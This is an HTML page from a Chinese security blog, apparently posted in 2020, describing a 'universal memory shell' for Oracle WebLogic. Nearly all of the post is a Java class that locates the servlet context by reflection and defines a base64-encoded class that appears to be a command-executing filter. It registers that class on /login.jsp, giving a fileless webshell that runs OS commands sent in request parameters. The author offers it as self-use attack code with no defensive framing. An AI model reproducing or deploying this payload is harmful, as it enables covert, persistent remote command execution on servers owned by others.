@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>weblogic 通用内存马(filter)方案 | 侠客行|</title>
+        <link rel="stylesheet" href="https://ICheeryI.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://ICheeryI.github.io">侠客行|</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s">学如逆水行舟</div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/Cheery">关于我</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">weblogic 通用内存马(filter)方案</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2020-11-22 11:29:44">2020-11-22 / 4 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h2 id="前言">前言</h2>
+<blockquote>
+<p>关于内存马的寻找: servler3.0-&gt; 关注各个容器的实现 -&gt; 找到关键的管理器 -&gt; 内存搜索+反射调用<br>
+不能光解决问题,应该还需要优化代码</p>
+</blockquote>
+<h2 id="java-代码">java 代码</h2>
+<p>这是一个自用的，代码不够优化</p>
+<pre><code>package ysoserial.payloads.util;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import sun.misc.BASE64Decoder;
+
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.*;
+
+public class weblogic_filter_test {
+    static HashSet&lt;Object&gt; h;
+    static ClassLoader cl = Thread.currentThread().getContextClassLoader();
+    static Class filter;
+    static Object r;
+    static Object p;
+
+    static
+    {
+        r = null;
+        p = null;
+        h =new HashSet&lt;Object&gt;();
+        try {
+            filter = cl.loadClass(&quot;weblogic.servlet.internal.WebAppServletContext&quot;);
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+
+        F(Thread.currentThread(),0);
+    }
+
+    private static boolean i(Object obj){
+        if(obj==null|| h.contains(obj)){
+            return true;
+        }
+
+        h.add(obj);
+        return false;
+    }
+    private static void p(Object o, int depth){
+        if(depth &gt; 52||(r !=null&amp;&amp; p !=null)){
+            return;
+        }
+        if(!i(o)){
+            if(r ==null&amp;&amp;filter.isAssignableFrom(o.getClass())){
+                //r = o;
+                try {
+                    System.out.println(o.getClass());
+                    Field classLoaderF = o.getClass().getDeclaredField(&quot;classLoader&quot;);
+                    classLoaderF.setAccessible(true);
+                    ClassLoader cl = (ClassLoader) classLoaderF.get(o);
+                    Field cachedClassesF = cl.getClass().getDeclaredField(&quot;cachedClasses&quot;);
+                    cachedClassesF.setAccessible(true);
+                    Object cachedClass = cachedClassesF.get(cl);
+
+                    Method getM = cachedClass.getClass().getDeclaredMethod(&quot;get&quot;, Object.class);
+                    if (getM.invoke(cachedClass, &quot;testxxoo1&quot;) == null) {
+                        // filter in there
+                        String aaa = &quot;yv66vgAAADIArwoAJQBYCQBZAFoIAFsKAFwAXQgASQsAXgBfCABgCgBZAGEKAAwAYggAYwoADABkBwBlCABmCABnCABoCABpCgBqAGsKAGoAbAcAbQcAbgoAbwBwCgAUAHEKABMAcgcAcwoAGABYCgATAHQKABgAdQoAGAB2CgAYAHcLAHgAeQoADAB6CgB7AHwKAHsAfQoAewB+CwB/AIAHAIEHAIIHAIMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdGVzdC9maWx0ZXJfZGVtbzsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwCEAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAEbGluZQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADY21kAQANU3RhY2tNYXBUYWJsZQcAZQcAOwcAgQcAhQcAhgcAhwcAiAcAbQcAcwcAiQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQZmlsdGVyX2RlbW8uamF2YQwAJwAoBwCKDACLAIwBAF9Ub21jYXRTaGVsbEluamVjdCBkb0ZpbHRlci4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLgcAjQwAjgCPBwCFDACQAJEBAAdvcy5uYW1lDACSAJEMAJMAlAEAA3dpbgwAlQCWAQAQamF2YS9sYW5nL1N0cmluZwEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJcMAJgAmQwAmgCbAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAIgMAJwAnQwAJwCeDAAnAJ8BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAoACUDAChAKIMAKEAowwApACUBwCGDAClAKYMAKcAqAcAqQwAqgCrDACsACgMAK0AKAcAhwwANACuAQAjeXNvc2VyaWFsL3BheWxvYWRzL3Rlc3QvZmlsdGVyX2RlbW8BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAHChDKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBAAhnZXRCeXRlcwEABCgpW0IBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAAVjbG9zZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAkACUAAQAmAAAABAABACcAKAABACkAAAAvAAEAAQAAAAUqtwABsQAAAAIAKgAAAAYAAQAAAAYAKwAAAAwAAQAAAAUALAAtAAAAAQAuAC8AAgApAAAANQAAAAIAAAABsQAAAAIAKgAAAAYAAQAAAAkAKwAAABYAAgAAAAEALAAtAAAAAAABADAAMQABADIAAAAEAAEAMwABADQANQACACkAAAIbAAUADAAAAOKyAAISA7YABCsSBbkABgIAWToExgDGBDYFEge4AAg6BhkGxgATGQa2AAkSCrYAC5kABgM2BRUFmQAZBr0ADFkDEg1TWQQSDlNZBRkEU6cAFga9AAxZAxIPU1kEEhBTWQUZBFM6B7gAERkHtgASOgi7ABNZuwAUWRkItgAVtwAWtwAXOgm7ABhZtwAZOgoZCbYAGlk6C8YAIBkKuwAYWbcAGRkLtgAbEAq2ABy2AB22ABtXp//bLLkAHgEAGQq2AB22AB+2ACAsuQAeAQC2ACEsuQAeAQC2ACKxLSssuQAjAwCxAAAAAwAqAAAATgATAAAADgAIABEAFgASABkAEwAgABQAMgAVADUAFwBlABgAbwAZAHkAGgCEABsAjQAdAJgAHgC1ACAAxgAhAM8AIgDYACMA2QAlAOEAJgArAAAAegAMABkAwAA2ADcABQAgALkAOAA5AAYAZQB0ADoAOwAHAG8AagA8AD0ACACEAFUAPgA/AAkAjQBMAEAAQQAKAJUARABCADkACwAAAOIALAAtAAAAAADiAEMARAABAAAA4gBFAEYAAgAAAOIARwBIAAMAEwDPAEkAOQAEAEoAAABTAAb+ADUHAEsBBwBLGlIHAEz/ACkACwcATQcATgcATwcAUAcASwEHAEsHAEwHAFEHAFIHAFMAAPwAJwcAS/8AIwAFBwBNBwBOBwBPBwBQBwBLAAAAMgAAAAYAAgBUADMAAQBVACgAAQApAAAAKwAAAAEAAAABsQAAAAIAKgAAAAYAAQAAACoAKwAAAAwAAQAAAAEALAAtAAAAAQBWAAAAAgBX&quot;;
+                        final BASE64Decoder decoder = new BASE64Decoder();
+                        byte[] classbytes = decoder.decodeBuffer(aaa);
+                        Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+                        defineClass.setAccessible(true);
+                        Class evilFilterClass = (Class) defineClass.invoke(cl, classbytes, 0, classbytes.length);
+                        Method putM = cachedClass.getClass().getDeclaredMethod(&quot;put&quot;, Object.class, Object.class);
+                        putM.invoke(cachedClass, &quot;testxxoo1&quot;, evilFilterClass);
+                        System.out.println(evilFilterClass);
+                    }else {
+                        System.out.println(&quot;----------------------------------&quot;);
+                    }
+                    // TO DO: While( filter) {Add filter} while循环，避免重复添加，虽然现在也能用，但是可以优美代码
+                    Method getFilterManagerM = o.getClass().getDeclaredMethod(&quot;getFilterManager&quot;);
+                    Object filterManager = getFilterManagerM.invoke(o);
+                    Method registerFilterM = filterManager.getClass().getDeclaredMethod(&quot;registerFilter&quot;, String.class, String.class, String[].class, String[].class, Map.class, String[].class);
+                    registerFilterM.setAccessible(true);
+                    registerFilterM.invoke(filterManager, &quot;test1&quot;, &quot;testxxoo1&quot;, new String[]{&quot;/login.jsp&quot;}, null, null, null);
+                } catch (Exception e){
+                    System.out.print(&quot;Error&quot;);
+                    e.printStackTrace();
+                }
+            }
+            F(o,depth+1);
+        }
+    }
+    private static void F(Object start, int depth){
+
+        Class n=start.getClass();
+        do{
+            for (Field declaredField : n.getDeclaredFields()) {
+                declaredField.setAccessible(true);
+                Object o = null;
+                try{
+                    o = declaredField.get(start);
+
+                    if(!o.getClass().isArray()){
+                        p(o,depth);
+                    }else{
+                        for (Object q : (Object[]) o) {
+                            p(q, depth);
+                        }
+
+                    }
+
+                }catch (Exception e){
+                }
+            }
+
+        }while(
+            (n = n.getSuperclass())!=null
+        );
+    }
+}
+
+</code></pre>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://ICheeryI.github.io/wXQmxJ_Je/">weblogic 通用内存马(filter)方案</a></div></div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://ICheeryI.github.io/xslt-java/">java中的xslt实现(xalan)</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://ICheeryI.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      <p>Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> <br/> Theme <a href="https://github.com/shanbufun/gridea-theme-song" target="_blank"  title="宋"  >Song</a> by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >shanbufun</a> </p>
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
